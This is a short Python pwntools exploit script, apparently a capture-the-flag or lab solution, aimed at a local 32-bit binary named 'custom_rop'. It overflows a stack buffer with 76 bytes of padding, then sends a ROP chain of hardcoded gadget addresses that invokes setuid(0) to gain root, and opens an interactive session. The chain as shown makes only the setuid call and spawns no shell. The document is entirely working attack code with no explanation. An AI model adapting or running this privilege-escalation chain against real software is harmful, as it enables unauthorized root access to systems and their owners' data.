#!/usr/bin/env python3
from pwn import *

# Configure binary
binary = './custom_rop'
context.binary = binary
context.arch = 'i386'
context.terminal = ['tmux', 'split-window', '-h']

# Addresses from binary
set_eax = 0x080491a6
set_ebx = 0x080491b8
gadget1 = 0x08049225  # xor edx, edx
gadget2 = 0x08049238  # xor ecx, ecx
do_syscall = 0x080491ca

# Build ROP chain
payload = flat(
    b'A' * 76,         # Padding to reach return address
    set_eax,           # Set EAX to syscall number
    23,                # setuid syscall number
    set_ebx,           # Set EBX to argument
    0,                 # UID 0 for root
    gadget1,           # Zero out EDX
    gadget2,           # Zero out ECX
    do_syscall         # Execute syscall
)

def exploit():
    p = process(binary)
    print(p.clean())
    
    print("[*] Sending ROP chain...")
    p.sendline(payload)
    
    p.interactive()

if __name__ == "__main__":
    exploit()
